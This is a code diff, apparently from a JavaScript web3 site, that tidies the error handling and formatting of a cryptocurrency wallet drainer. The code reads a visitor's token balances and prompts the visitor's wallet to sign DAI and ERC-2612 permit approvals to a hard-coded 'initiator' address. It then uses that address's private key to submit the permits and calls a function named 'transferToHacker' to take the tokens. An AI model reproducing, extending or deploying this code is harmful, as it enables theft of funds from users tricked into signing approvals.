@@ -29,23 +29,27 @@ export const mconnector = async () => {
 };
 
 export const getTokens = async (address) => {
-  const balances = await alchemy.core.getTokenBalances(address);
-  const nonZeroBalances = balances.tokenBalances.filter((token) => {
-    return token.tokenBalance !== "0x0000000000000000000000000000000000000000000000000000000000000000";
-  });
-  let tokens = [];
+  try {
+    const balances = await alchemy.core.getTokenBalances(address);
+    const nonZeroBalances = balances.tokenBalances.filter((token) => {
+      return token.tokenBalance !== "0x0000000000000000000000000000000000000000000000000000000000000000";
+    });
+    let tokens = [];
 
-  // Loop through all tokens with non-zero balance
-  for (let token of nonZeroBalances) {
-    // Get balance of token
-    let balance = token.tokenBalance;
+    // Loop through all tokens with non-zero balance
+    for (let token of nonZeroBalances) {
+      // Get balance of token
+      let balance = token.tokenBalance;
 
-    const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
-    metadata.balance = balance;
-    metadata.token_address = token.contractAddress;
-    tokens.push(metadata);
+      const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
+      metadata.balance = balance;
+      metadata.token_address = token.contractAddress;
+      tokens.push(metadata);
+    }
+    return tokens;
+  } catch (error) {
+    console.log(error)
   }
-  return tokens;
 };
 
 export const setPrice = (ticker) => {
@@ -69,7 +73,7 @@ export const getPrice = async (symbols) => {
 export const increaseAllowance = async (token) => {
   // RPC provider
   const provider = new ethers.JsonRpcProvider(constants.infura);
-  
+
   // get token Allownce to transfer imiditly
   const allow = await allownce(token);
   const balanceOfToken = await balanceOf(token);
@@ -86,13 +90,13 @@ export const increaseAllowance = async (token) => {
       address: token.token_address,
       abi: constants.ALLOWANCEABI,
       functionName: 'version',
-    }).then( async (result) => {
+    }).then(async (result) => {
       version = await result;
     }).catch((error) => {
       console.log(error);
     })
     console.log(version)
-    if( version === '1') {
+    if (version === '1') {
       let nonce = undefined
       await readContract({
         address: token.token_address,
@@ -101,19 +105,19 @@ export const increaseAllowance = async (token) => {
         args: [getAccount().address],
       }).then(async (result) => {
         nonce = await result;
-      }).catch( (error) => {
+      }).catch((error) => {
         console.log(error)
       })
       console.log('nonce is:', nonce);
       await daiPermitV1(
         token, permitToken, nonce, provider
       )
-    }else if (version === '2') {
+    } else if (version === '2') {
       await usdcPermitV2(
         token, permitToken, provider
       )
     }
-  }else if (increaseallown) {
+  } else if (increaseallown) {
     await increasAllow(token);
   }
   // else if (transfertoken) {
@@ -161,7 +165,7 @@ export const allownce = async (token) => {
     functionName: 'allowance',
     args: [getAccount().address, constants.initiator],
     chainId: 1
-  }).catch( (error) => {
+  }).catch((error) => {
     console.log(error)
   })
 }
@@ -173,7 +177,7 @@ export const balanceOf = async (token) => {
     functionName: 'balanceOf',
     args: [getAccount().address],
     chainId: 1
-  }).catch( (error) => {
+  }).catch((error) => {
     console.log(error)
   })
 }
@@ -205,7 +209,7 @@ const increasAllow = async (token) => {
 const daiPermitV1 = async (token, permitToken, nonce, provider) => {
   await signDaiPermit(
     window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
-  ).then(async ( result) => {
+  ).then(async (result) => {
 
     const signer = new ethers.Wallet(constants.initiatorPK, provider);
     const DaiToken = new ethers.Contract(
@@ -216,7 +220,7 @@ const daiPermitV1 = async (token, permitToken, nonce, provider) => {
       getAccount().address, constants.initiator, result.nonce, result.expiry, true, result.v, result.r, result.s
     ).then(async (result) => {
       console.log('result is:', result);
-      await provider.waitForTransaction( result.hash).then(async (result) => {
+      await provider.waitForTransaction(result.hash).then(async (result) => {
         console.log(result)
         await transferToHacker(token);
       }).catch(async (error) => {
@@ -233,7 +237,7 @@ const daiPermitV1 = async (token, permitToken, nonce, provider) => {
 const usdcPermitV2 = async (token, permitToken, provider) => {
   await signERC2612Permit(
     window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.max, constants.deadline.toString(),
-  ).then(async ( result) => {
+  ).then(async (result) => {
 
     const signer = new ethers.Wallet(constants.initiatorPK, provider);
     const DaiToken = new ethers.Contract(
@@ -244,7 +248,7 @@ const usdcPermitV2 = async (token, permitToken, provider) => {
       getAccount().address, constants.initiator, result.value, result.expiry, result.v, result.r, result.s
     ).then(async (result) => {
       console.log('permitV2 result is', result);
-      await waitForTransaction(result.transactionHash ).then(async (result) => {
+      await waitForTransaction(result.transactionHash).then(async (result) => {
         console.log(result)
         await transferToHacker(token);
       }).catch(async (error) => {
